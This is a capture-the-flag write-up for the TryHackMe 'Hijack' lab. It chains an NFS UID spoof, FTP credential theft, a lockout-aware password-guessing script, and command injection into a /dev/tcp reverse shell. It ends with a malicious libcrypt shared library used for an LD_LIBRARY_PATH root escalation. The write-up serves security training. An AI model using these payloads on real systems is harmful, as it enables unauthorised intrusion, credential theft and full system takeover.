| Category          | Details                                                           |
|-------------------|-------------------------------------------------------------------|
| 📝 **Name**       | [Hijack](https://tryhackme.com/room/hijack)                       |  
| 🏷 **Type**       | THM Challenge                                                     |
| 🖥 **OS**         | Linux                                                             |
| 🎯 **Difficulty** | Easy                                                              |
| 📁 **Tags**       | NFS, Dictionary attack, Command injection, LD_LIBRARY_PATH hijack |

# Scan
```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      43785/tcp6  mountd
|   100005  1,2,3      47369/udp6  mountd
|   100005  1,2,3      48956/udp   mountd
|   100005  1,2,3      51801/tcp   mountd
|   100021  1,3,4      33378/tcp6  nlockmgr
|   100021  1,3,4      39939/udp6  nlockmgr
|   100021  1,3,4      40657/tcp   nlockmgr
|   100021  1,3,4      58354/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
38809/tcp open  mountd   1-3 (RPC #100005)
40148/tcp open  mountd   1-3 (RPC #100005)
40657/tcp open  nlockmgr 1-4 (RPC #100021)
51801/tcp open  mountd   1-3 (RPC #100005)
```

# Solution

#### List mounts target NFS server
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ showmount -e $TARGET
Export list for [10.82.162.152:
/mnt/share *
```

#### Mount unsecured `/mnt/share`
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ mkdir share && sudo mount -t nfs $TARGET://mnt/share share
```

#### Change directory to `share`
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ cd share
cd: permission denied: share
```

#### Check owner and permissions for `share` mount
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ ls -la
total 12
drwxrwxr-x  3 magicrc magicrc 4096 Dec 10 19:51 .
drwxrwxr-x 31 magicrc magicrc 4096 Dec 10 17:50 ..
drwx------  2    1003    1003 4096 Aug  8  2023 share
```

#### Create user with ID 1003 and use it to bypass permission check
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ sudo useradd -u 1003 -m user1003 && sudo su user1003
$ id
uid=1003(user1003) gid=1003(user1003) groups=1003(user1003)
$ ls -l
total 4
drwx------ 2 user1003 user1003 4096 Aug  8  2023 share
```

#### Access `for_employees.txt` in the `share` directory to retrieve the credentials for `ftpuser`
```
$ ls -la share
total 12
drwx------ 2 user1003 user1003 4096 Aug  8  2023 .
drwxrwxr-x 3 magicrc  magicrc  4096 Dec 10 19:51 ..
-rwx------ 1 user1003 user1003   46 Aug  8  2023 for_employees.txt
$ cat share/for_employees.txt
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

#### Use disclosed credentials to access FTP
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ ftp ftpuser@$TARGET
Connected to [10.82.162.152.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||46001|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
226 Directory send OK.
```

#### Exfiltrate `.from_admin.txt` and `.passwords_list.txt`
```
ftp> get .from_admin.txt
local: .from_admin.txt remote: .from_admin.txt
229 Entering Extended Passive Mode (|||6988|)
150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
100% |*******************************************************************************************************************************************************|   368        8.77 MiB/s    00:00 ETA
226 Transfer complete.
368 bytes received in 00:00 (4.08 KiB/s)
ftp> get .passwords_list.txt
local: .passwords_list.txt remote: .passwords_list.txt
229 Entering Extended Passive Mode (|||36234|)
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
100% |*******************************************************************************************************************************************************|  3150       13.84 MiB/s    00:00 ETA
226 Transfer complete.
3150 bytes received in 00:00 (72.87 KiB/s)
```

#### Check content of `.from_admin.txt`
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ cat .from_admin.txt    
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```
The file indicates that the `admin` user relies on a password contained within `.passwords_list.txt`, that a system user named `rick` may be present, and that a login throttling mechanism is enforced. Specifically, five consecutive failed login attempts on the admin account trigger a 300-second lockout.

#### Conduct a dictionary attack against the `admin` user on the web application
Given a 5-minute lockout after 5 failed attempts and a 150-entry password list, the maximum time required for the attack is about 2 hours and 30 minutes.
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ user_name=admin && \  
echo -n "[*] Executing dictionary attack against user \e[1;37m$user_name\e[0m..."
while read -r password; do \
    echo -n "\n[*] Checking: [\e[1;37m$password\e[0m"]
    result=""
    while true; do
        result=$(curl -s -c cookies.txt http://$TARGET/login.php -d "username=$user_name&password=$password")
        if [[ "$result" != *"This account has been locked"* ]]; then
            break
        fi
        echo -n "\n[*] Account locked, waiting for unlock..."
        sleep 10
    done
    if [[ "$result" != *"The password you entered is not valid"* ]]; then
        echo -n "\r\033[K[*] \033[43;31mFound $password\033[0m"; break
    fi
    sleep 1
done < .passwords_list.txt
<SNIP>
[*] Account locked, waiting for unlock...
[*] Account locked, waiting for unlock...
[*] Checking: [4TymWfYFKun9ne9vbJnG]
[*] Checking: [cT6GF9MHvSCtrpbp7UYf]
[*] Found uDh3jCQsdcuLhjVkAy5x 
```

#### Login as `admin` user using discovered password
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ curl -c cookies.txt http://$TARGET/login.php -d 'username=admin&password=uDh3jCQsdcuLhjVkAy5x' && \
curl -b cookies.txt http://$TARGET/administration.php
<SNIP>
    <h2 style="text-align: center;">Services Status Checker</h2>
    <br>
    <form method="POST">
        <label for="command">Provide the service name :</label>
        <input type="text" name="service" id="service" required>
        <br>
        <button type="submit" name="submit">Execute</button>
    </form>
<SNIP>
```
After successful login we can see that 'Administration Panel' gives ability to check status of service running on target by specifying its name.

#### Run service status check for `apache2`
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ curl -b cookies.txt http://$TARGET/administration.php -d 'service=apache2&submit='
<SNIP>
<pre>* apache2.service - LSB: Apache2 web server
   Loaded: loaded (/etc/init.d/apache2; bad; vendor preset: enabled)
  Drop-In: /lib/systemd/system/apache2.service.d
           `-apache2-systemd.conf
   Active: active (running) since Thu 2025-12-11 07:10:32 UTC; 15min ago
     Docs: man:systemd-sysv-generator(8)
  Process: 1129 ExecStart=/etc/init.d/apache2 start (code=exited, status=0/SUCCESS)
    Tasks: 10
   Memory: 41.3M
      CPU: 155ms
   CGroup: /system.slice/apache2.service
           |-1239 /usr/sbin/apache2 -k start
           |-1262 /usr/sbin/apache2 -k start
           |-1263 /usr/sbin/apache2 -k start
           |-1264 /usr/sbin/apache2 -k start
           |-1265 /usr/sbin/apache2 -k start
           |-1266 /usr/sbin/apache2 -k start
           |-1407 /usr/sbin/apache2 -k start
           |-1425 sh -c /bin/bash /var/www/html/service_status.sh apache2
           |-1426 /bin/bash /var/www/html/service_status.sh apache2
           `-1427 systemctl status apache2
</pre>
<SNIP>
```
We could try to inject command in `service` HTTP parameter.

#### Inject `id` using `&&` as command separator
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ curl -b cookies.txt http://$TARGET/administration.php -d 'service=apache2%26%26id&submit='
<SNIP>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<SNIP>
```
The use of `;` as a command separator was detected by the application as an attempted command injection.

#### Start `netcat` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection with command injection
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ SERVICE=$(echo -n "apache2&&/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" | jq -sRr @uri)
curl -b cookies.txt http://$TARGET/administration.php -d "service=$SERVICE&submit="
```

#### Confirm foothold gained
```
connect to [192.168.132.170] from (UNKNOWN) [10.82.162.152] 59198
bash: cannot set terminal process group (1239): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Hijack:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Discover database credentials for user `rick` in `/var/www/html/config.php`
```
www-data@Hijack:/var/www/html$ cat /var/www/html/config.php
cat /var/www/html/config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

#### Reuse disclosed credentials to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/THM Hijack]
└─$ ssh rick@$TARGET
<SNIP>
$ id
uid=1003(rick) gid=1003(rick) groups=1003(rick)
```

#### Capture 1s flag
```
$ cat /home/rick/user.txt
THM{********************************}
```

#### List allowed `sudo` commands
```
$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
User `rick` is permitted to run `/usr/sbin/apache2` as `root`, and because `LD_LIBRARY_PATH` is preserved (`env_keep+=LD_LIBRARY_PATH`) in the sudo environment, the user can influence where Apache searches for shared libraries.

#### List shared libraries used by `/usr/sbin/apache2`
```
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007ffe37513000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f9ad4b82000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007f9ad495b000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007f9ad4729000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f9ad450c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9ad4142000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f9ad3f0a000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f9ad3ce1000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f9ad3adc000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f9ad38d8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f9ad5097000)
```

#### Prepare root shell spawning version of `libcrypt.so`
```
$ { cat <<'EOF'> /tmp/libcrypt.c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
      unsetenv("LD_LIBRARY_PATH");
      setresuid(0,0,0);
      system("/bin/bash -p");
}
EOF
} && gcc -fPIC -shared /tmp/libcrypt.c -o /tmp/libcrypt.so.1
/tmp/libcrypt.c: In function ‘hijack’:
/tmp/libcrypt.c:8:7: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
       setresuid(0,0,0);
       ^
```

#### Hijack `LD_LIBRARY_PATH` to use root spawning version of `libcrypt.so.1`
```
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture 2nd flag
```
root@Hijack:~# cat /root/root.txt 

██╗░░██╗██╗░░░░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██║░░░░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║██║░░░░░██║███████║██║░░╚═╝█████═╝░
██╔══██║██║██╗░░██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║╚█████╔╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

THM{********************************}
```